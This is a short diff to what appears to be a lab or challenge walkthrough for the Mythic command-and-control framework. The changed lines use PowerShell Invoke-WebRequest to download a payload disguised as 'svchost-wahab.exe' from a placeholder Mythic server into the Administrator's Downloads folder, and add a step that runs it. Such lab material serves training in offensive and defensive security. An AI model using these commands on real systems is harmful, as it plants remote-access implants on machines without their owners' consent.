@@ -185,10 +185,14 @@ Use PowerShell to download the payload from the Mythic server.
 Command:
 
 ```
-Invoke-WebRequest -Uri http://<Challenge-Mythic-IP>:9999/svchost-wahab.exe -OutFile C:\Users\Public\Downloads\svchost-wahab.exe
+Invoke-WebRequest -Uri http://<Challenge-Mythic-IP>:9999/svchost-wahab.exe -OutFile C:\Users\Administrator\Downloads\svchost-wahab.exe
 ```
 
 **Execute Payload**:
+
+```
+.\svchost-wahab.exe
+```
 
 Allow the port `80` communication on `Challenge-Mythic` Server using
 
